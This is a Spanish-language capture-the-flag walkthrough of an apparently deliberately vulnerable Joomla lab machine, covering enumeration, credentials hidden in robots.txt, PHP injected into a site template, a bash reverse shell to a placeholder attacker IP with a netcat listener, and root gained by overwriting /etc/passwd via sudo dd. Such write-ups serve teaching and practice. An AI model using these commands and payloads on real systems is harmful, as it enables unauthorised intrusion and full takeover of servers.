## 1. Reconocimiento Inicial

### 1.1 Reconocimiento Inicial con Nmap

Iniciamos la auditoría con un escaneo exhaustivo de puertos para identificar la superficie de ataque y los servicios expuestos.

```bash
nmap -O -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados:**

- `80/tcp open http Apache httpd 2.4.58`: Servidor web activo. El escaneo revela que se está utilizando el CMS **Joomla!**.
- `http-robots.txt`: Nmap detecta un archivo `robots.txt` con varias entradas `Disallow`, lo que nos marca un vector inicial de enumeración.

### 1.2. Análisis de la Página Web con WhatWeb

Utilizamos `whatweb` para obtener más información sobre la tecnología utilizada en la página web. Esta herramienta escaneará la URL y reportará tecnologías, versiones y otros detalles.

```bash
whatweb http://<IP_DEL_OBJETIVO>
```

**Resultados:**

*   Confirma el uso de `Joomla! - Open Source Content Management`.
*   Identifica el servidor Apache y su versión.
*   Muestra un posible nombre de usuario o pista en el atributo `alt` de una imagen: `TLuisillo_o` (`<img src="/media/templates/site/cassiopeia/images/logo.svg" alt="TLuisillo_o" class="logo d-inline-block">`). Esta es una pista importante para futuras fases.

## 2. Enumeración Web y Obtención de Credenciales

Con la confirmación del CMS Joomla! y la existencia del archivo `robots.txt`, profundizamos en la enumeración de directorios.
![[Candy.png]]
### 2.1. Fuzzing Web con Gobuster

Realizamos un fuzzing de directorios con `gobuster` para descubrir rutas ocultas o archivos interesantes en el servidor web. Esto nos ayuda a mapear la estructura del sitio y encontrar posibles puntos de entrada.

```bash
gobuster dir -w /path/to/wordlist/directory-list-2.3-medium.txt -u http://<IP_DEL_OBJETIVO> -x php,html,txt
```

**Resultados Relevantes:**

*   `/administrator`: Este directorio es crucial, ya que es la interfaz de administración de Joomla!.
*   `/un_caramelo`: Un directorio inusual que podría contener información.
*   `/robots.txt`: Confirmado por Nmap, este archivo es de particular interés.

### 2.2. Análisis de `robots.txt`

El archivo `robots.txt` es un archivo de texto que los sitios web utilizan para indicar a los rastreadores de motores de búsqueda qué páginas o archivos no deben rastrear. Sin embargo, para un atacante, estas entradas `Disallow` pueden ser una lista de directorios y archivos interesantes que el administrador no quiere que sean públicos.

Al examinar el contenido de `http://<IP_DEL_OBJETIVO>/robots.txt`, encontramos una línea inesperada al final:

```bash
admin:c2FubHVpczEyMzQ1
```

La parte `c2FubHVpczEyMzQ1` es una cadena codificada.

### 2.3. Decodificación de Credenciales

La cadena `c2FubHVpczEyMzQ1` tiene el formato de una codificación Base64. La decodificamos para revelar la contraseña.

```bash
echo "c2FubHVpczEyMzQ1" | base64 -d
# sanluis12345
```

Ahora tenemos un par de credenciales: `admin:sanluis12345`.

## 3. Acceso al Panel de Administración de Joomla!

Con las credenciales obtenidas, iniciamos sesión en el panel de administración de Joomla!.
![[Candy_InicioSesión.png]]
### 3.1. Inicio de Sesión en `/administrator`

Navegamos a la ruta administrativa (`http://<IP_DEL_OBJETIVO>/administrator/index.php`) e iniciamos sesión con las credenciales obtenidas. El acceso es exitoso y verificamos que la versión del CMS es la 4.1.2.

En lugar de buscar un exploit público, aprovecharemos una funcionalidad legítima de Joomla! que permite a los administradores editar el código fuente de las plantillas para lograr ejecución de comandos.

### 3.2. Modificación de Plantilla y Reverse Shell

Nos dirigimos a **System -> Site Templates** y seleccionamos la plantilla activa (por ejemplo, _Cassiopeia_). Editamos el archivo `index.php`.

Para verificar la ejecución de comandos, podemos añadir una línea simple como `system('whoami');`.

```php
<?php
// ... código existente ...
system('whoami'); // Añadimos esta línea para probar la ejecución de comandos
// ... más código existente ...
?>
```
![[Candy_whoami.png]]

Al guardar y recargar la página principal del sitio, deberíamos ver el resultado del comando `whoami` (por ejemplo, `www-data`), confirmando que podemos ejecutar comandos en el servidor web.

### 3.3. Ejecución de Reverse Shell

Una vez confirmada la ejecución de comandos, reemplazamos el comando `system('whoami');` con un payload de reverse shell. Este payload hará que el servidor se conecte a nuestra máquina atacante, dándonos una shell interactiva.

**Payload de Reverse Shell (PHP):**

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_DE_TU_KALI>/443 0>&1'");
```

**En la Máquina Atacante:**

Antes de recargar la página, configuramos un `netcat` listener en nuestra máquina atacante para recibir la conexión entrante en el puerto 443.

```bash
nc -lvnp 443
```

Recargamos la página web de Joomla! en el navegador. Esto ejecutará el código PHP inyectado y nos dará una shell inversa en nuestra máquina atacante.

```bash
www-data@<ID_DEL_CONTENEDOR>:/var/www/html/joomla$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmamos que estamos como el usuario `www-data`.

### 3.4. Tratamiento de la TTY (Opcional pero Recomendado)

Para una mejor interacción con la shell (autocompletado, historial, etc.), es recomendable convertirla en una TTY (terminal) interactiva. Esto se logra con los siguientes comandos:

1.  **Ejecutar `script`:**
    ```bash
    script /dev/null -c bash
    ```
2.  **Suspender el proceso:**
    ```bash
    Ctrl + Z
    ```
3.  **Configurar la terminal:**
    ```bash
    stty raw -echo; fg
    ```
4.  **Restablecer la terminal:**
    ```bash
    reset
    ```
5.  **Especificar tipo de terminal (si se pregunta):**
    ```bash
    xterm
    ```
6.  **Exportar variables de entorno:**
    ```bash
    export TERM=xterm
    export SHELL=bash
    ```

## 4. Movimiento Lateral

Una vez que tenemos una shell como `www-data`, el objetivo es escalar privilegios a `root`.

### 4.1. Búsqueda de Información Sensible

Buscamos archivos `.txt` en directorios no estándar:

```Bash
find / -name "*.txt" -type f 2>/dev/null | grep -v "/proc\|/sys"
```

Identificamos un archivo sospechoso: `/var/backups/hidden/otro_caramelo.txt`. Al leer su contenido, encontramos credenciales de base de datos en texto plano:

```PHP
$db_host = 'localhost';
$db_user = 'luisillo';
$db_pass = 'luisillosuperpassword';
$db_name = 'joomla_db';
```

### 4.2. Pivoting al usuario `luisillo`

Verificamos en `/etc/passwd` que el usuario `luisillo` existe en el sistema. Utilizamos la contraseña encontrada para cambiar de usuario:

```Bash
su luisillo
# Password: luisillosuperpassword
```

El movimiento lateral es exitoso.

## 5. Escalada de Privilegios

### 5.1. Enumeración de Sudoers

Como el usuario `luisillo`, revisamos los privilegios administrativos asignados:

```Bash
sudo -l
```

**Salida:**

```
User luisillo may run the following commands on candy:
    (ALL) NOPASSWD: /bin/dd
```

El usuario puede ejecutar la herramienta de copiado a bajo nivel `dd` como superusuario sin necesidad de contraseña. `dd` puede leer y escribir archivos arbitrarios.

### 5.2. Manipulación de `/etc/passwd` mediante `dd`

Para escalar a root, utilizaremos `dd` para sobrescribir el archivo `/etc/passwd` del sistema, eliminando la `x` que delega la contraseña a `/etc/shadow`, permitiendo así iniciar sesión como root sin credenciales.

**1. Hacemos una copia local del archivo:**

```Bash
cp /etc/passwd /tmp/passwd.bak
```

**2. Editamos la copia:**

```Bash
nano /tmp/passwd.bak
```

Cambiamos la línea de root: _De:_ `root:x:0:0:root:/root:/bin/bash` _A:_ `root::0:0:root:/root:/bin/bash`

**3. Sobrescribimos el archivo original usando `dd`:**

```Bash
sudo /bin/dd if=/tmp/passwd.bak of=/etc/passwd
```

_(Nota: `if` = input file, `of` = output file)._

### 5.3. Obtención de Root

Con el requerimiento de contraseña eliminado, cambiamos al usuario root:

```Bash
su -
```

Verificamos el compromiso total del sistema:

```Bash
whoami
# root
```
